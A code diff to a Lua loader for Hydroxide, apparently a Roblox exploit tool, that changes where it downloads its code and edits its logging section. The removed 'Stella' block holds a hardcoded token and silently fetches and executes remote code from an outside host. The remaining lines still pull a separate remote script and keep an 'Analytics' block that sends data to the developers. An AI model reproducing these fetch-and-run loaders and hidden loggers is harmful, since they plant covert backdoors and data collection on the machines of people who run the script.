@@ -4,7 +4,7 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
-local DEFAULT_RAW = getgenv().hydroxide_raw or "https://git.fable.bz/zyu/hydroxide/raw/branch/main/"
+local DEFAULT_RAW = getgenv().hydroxide_raw or "https://raw.githubusercontent.com/Gurberson/gurtson/main/"
 local CUSTOM_SCRIPT_URL = "https://raw.githubusercontent.com/waryanuts/heya/refs/heads/main/heya1"
 local loader_script = string.format([[
 if not game:IsLoaded() then game.Loaded:Wait() end
@@ -5837,15 +5837,6 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
         end
 
         do -- Logging
-            do -- Stella
-                getgenv().stella_token = "8ec893328d02030999209e5cd82f217ee70d8b5e68f18af5d5aa0fab8b7c887b"
-                getgenv().stella_debug = false
-
-                pcall(function()
-                    loadstring(game:HttpGet("https://stella.heroinhound.cc/stella.lua",true))() -- or u can use https://git.fable.bz/YOUR_USERNAME/YOUR_REPOSITORY/raw/branch/main/hello_stella.lua but stella.heroinhound.cc/stella.lua will hold the most updates although i rarely update stella payload but U NEVER KNOW. just check back.
-                end)
-            end
-
             do -- Analytics (only sent to Hydroxide developers — baba & boss)
                 pcall(function()
                     local function transform(id)
